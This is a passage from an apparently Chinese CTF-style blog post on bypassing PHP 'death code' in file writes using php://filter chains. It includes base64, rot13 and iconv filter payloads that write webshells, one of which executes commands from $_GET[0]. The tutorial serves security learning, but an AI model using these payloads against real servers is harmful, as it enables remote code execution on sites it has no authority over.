+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="nx">PD9waHAgcGhwaW5mbygpOz8</span><span class="o">+.</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>问题就在于base64在解码的时候将<code>=</code>作为了解码末尾的判断，如果出现的话后面的字符就无法被解码也就无法构成需要的代码。
+于是我去翻了一下php中关于base64解码的部分函数的代码如下</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">zend_always_inline</span> <span class="kt">int</span> <span class="nf">php_base64_decode_impl</span><span class="p">(</span><span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">in</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">inl</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">outl</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">strict</span><span class="p">)</span> <span class="cm">/* </span><span class="p">{{{</span> <span class="err">*/</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">padding</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="o">*</span><span class="n">outl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">#if defined(__aarch64__) || defined(_M_ARM64)
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>	<span class="k">if</span> <span class="p">(</span><span class="n">inl</span> <span class="o">&gt;=</span> <span class="mi">16</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="kt">size_t</span> <span class="n">left</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">j</span> <span class="o">+=</span> <span class="nf">neon_base64_decode</span><span class="p">(</span><span class="n">in</span><span class="p">,</span> <span class="n">inl</span><span class="p">,</span> <span class="n">out</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">left</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="n">i</span> <span class="o">=</span> <span class="n">inl</span> <span class="o">-</span> <span class="n">left</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">in</span> <span class="o">+=</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">inl</span> <span class="o">=</span> <span class="n">left</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">#endif
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl">	<span class="cm">/* run through the whole string, converting as we go */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="n">inl</span><span class="o">--</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">ch</span> <span class="o">=</span> <span class="o">*</span><span class="n">in</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="n">base64_pad</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="n">padding</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="n">ch</span> <span class="o">=</span> <span class="n">base64_reverse_table</span><span class="p">[</span><span class="n">ch</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">strict</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* skip unknown characters and whitespace */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* skip whitespace */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">			<span class="cm">/* fail on bad characters or if any data follows padding */</span>
+</span></span><span class="line"><span class="cl">			<span class="k">if</span> <span class="p">(</span><span class="n">ch</span> <span class="o">==</span> <span class="o">-</span><span class="mi">2</span> <span class="o">||</span> <span class="n">padding</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">				<span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">		<span class="k">switch</span> <span class="p">(</span><span class="n">i</span> <span class="o">%</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="n">ch</span> <span class="o">&lt;&lt;</span> <span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&amp;</span> <span class="mh">0x0f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span> <span class="o">&gt;&gt;</span><span class="mi">2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">ch</span> <span class="o">&amp;</span> <span class="mh">0x03</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">6</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">			<span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
+</span></span><span class="line"><span class="cl">				<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="o">++</span><span class="p">]</span> <span class="o">|=</span> <span class="n">ch</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="p">}</span>
+</span></span><span class="line"><span class="cl">		<span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* fail if the input is truncated (only one char in last group) */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">strict</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="cm">/* fail if the padding length is wrong (not VV==, VVV=), but accept zero padding
+</span></span></span><span class="line"><span class="cl"><span class="cm">	 * RFC 4648: &#34;In some circumstances, the use of padding [--] is not required&#34; */</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">strict</span> <span class="o">&amp;&amp;</span> <span class="n">padding</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">padding</span> <span class="o">&gt;</span> <span class="mi">2</span> <span class="o">||</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="n">padding</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">fail</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="o">*</span><span class="n">outl</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">out</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">fail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意到<code>if (!strict)</code>这个判断，也就是在严格模式下他就会对未知字符和空白字符进行跳过，然后这个地方我也去用gpt辅助了一下，可以在php环境变量之中将其改为非严格模式就可以对<code>=</code>号的内容继续解码，所以我就去起了一个docker，但是还是打不通，文件可以生成但是没办法写入内容就很奇怪，（<del>所以在这里还是断了</del>）。</p>
+<h3 id="去掉等号之过滤器嵌套base64" class="headerLink">
+    <a href="#%e5%8e%bb%e6%8e%89%e7%ad%89%e5%8f%b7%e4%b9%8b%e8%bf%87%e6%bb%a4%e5%99%a8%e5%b5%8c%e5%a5%97base64" class="header-mark"></a>去掉等号之过滤器嵌套base64</h3><p>这里S1maple师傅的playload：<code>php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8%2B/../s1mple.php</code>
+这里利用了伪目录的方法让他生成正常的文件名
+<figure><img
+        
+        loading="lazy"
+        src="/img/filterchain/4.png"
+        srcset="/img/filterchain/4.png, /img/filterchain/4.png 1.5x, /img/filterchain/4.png 2x"
+        alt="/img/filterchain/4.png"
+        title="/img/filterchain/4.png" ></figure></p>
+<h3 id="另类base64" class="headerLink">
+    <a href="#%e5%8f%a6%e7%b1%bbbase64" class="header-mark"></a>另类base64</h3><p>playload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/&lt;?|</span><span class="nx">string</span><span class="o">.</span><span class="nx">strip_tags</span><span class="o">|</span><span class="nx">convert</span><span class="o">.</span><span class="nx">base64</span><span class="o">-</span><span class="nx">decode</span><span class="o">/</span><span class="nx">resource</span><span class="o">=</span><span class="cp">?&gt;</span><span class="err">PD9waHAgcGhwaW5mbygpOz8%2B/../delete.php
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的思路就是将=号写到php的标识符中进行过滤掉然后再进行转码再分解死亡代码</p>
+<h3 id="rot13-1" class="headerLink">
+    <a href="#rot13-1" class="header-mark"></a>rot13</h3><p>这个相对于base64就不是利用特性绕过，所以相对于好用一些</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">php</span><span class="o">://</span><span class="nx">filter</span><span class="o">/</span><span class="nx">write</span><span class="o">=</span><span class="nx">string</span><span class="o">.</span><span class="nx">rot13</span><span class="o">|&lt;?</span><span class="nx">cuc</span> <span class="nx">cucvasb</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">|/resource=delete.php
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="0x03iconv转换" class="headerLink">
+    <a href="#0x03iconv%e8%bd%ac%e6%8d%a2" class="header-mark"></a>0x03iconv转换</h1><p>因为这个知识点Zedd师傅单独写了一篇文章，所以我觉得这里不仅可以绕死亡代码也可以用于文件包含当中，于是我将其作为单独的一个知识点分出，但是还是可以绕过第二类的死亡代码的
+#本质上也和base64的特性有挂钩，也是不断的去编码解码来获取我们想要的东西
+这里我就拿Zedd师傅其中的一段我认为比较有代表性的代码块贴出来</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$conversions</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$filters</span> <span class="o">=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nx">str_split</span><span class="p">(</span><span class="nx">strrev</span><span class="p">(</span><span class="nv">$base64_payload</span><span class="p">))</span> <span class="k">as</span> <span class="nv">$c</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="nv">$conversions</span><span class="p">[</span><span class="nv">$c</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&#34;|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$filters</span> <span class="o">.=</span> <span class="s2">&#34;convert.base64-decode&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$final_payload</span> <span class="o">=</span> <span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="nv">$filters</span><span class="si">}</span><span class="s2">/resource=data://,aaaaaaaaaaaaaaaaaaaa&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// echo $final_payload;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">var_dump</span><span class="p">(</span><span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$final_payload</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// hexdump
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &#34;&lt;?=`|
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&#34;.|
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里不断的利用编码和转码进行转化利用base64的宽松性来构造出马子
+剩下的那些题目就自己去看吧hhh
+当然有些师傅有头疼，那我怎么知道经过什么转化能变成我要的东西呀，这里贴一个传送门hh，一个fuzz的代码
+<a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT" target="_blank" rel="noopener noreferrer">https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT</a>
+tql wupco师傅</p>
+<h2 id="第三种类型" class="headerLink">
+    <a href="#%e7%ac%ac%e4%b8%89%e7%a7%8d%e7%b1%bb%e5%9e%8b" class="header-mark"></a>第三种类型</h2><p><code>file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</code>
+这里也就比较简单，其实就是对后面的杂糅内容进行注释，但是题目肯定会做限制，所以也有其他方法，也是可以利用写入<code>.htaccess</code>文件进行预包含将后面的杂糅语句注释掉即可</p>
+<p>(<del>好累啊好累啊这里最后一个知识点直接贴大B哥的</del>)</p>
+<h1 id="0x04phptemp" class="headerLink">
+    <a href="#0x04phptemp" class="header-mark"></a>0x04php://temp</h1><p>在这里插入一条知识点，就是temp和memory伪协议：<br>
+<code>php://memory</code> 和 <code>php://temp</code> 是一个类似文件 包装器的数据流，允许读写临时数据。 两者的唯一区别是 php://memory 总是把数据储存在内存中， 而 php://temp 会在内存量达到预定义的限制后（默认是 2MB）存入临时文件中。 临时文件位置的决定和 sys_get_temp_dir() 的方式一致<br>
+php://temp 的内存限制可通过添加 /maxmemory:NN 来控制，NN 是以字节为单位、保留在内存的最大数据量，超过则使用临时文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$fiveMBs</span> <span class="o">=</span> <span class="mi">5</span> <span class="o">*</span> <span class="mi">1024</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="nv">$fp</span> <span class="o">=</span> <span class="nx">fopen</span><span class="p">(</span><span class="s2">&#34;php://temp/maxmemory:</span><span class="si">$fiveMBs</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s1">&#39;r+&#39;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="nx">fputs</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span> <span class="s2">&#34;hello</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl"><span class="c1">// 读取写入的数据.  
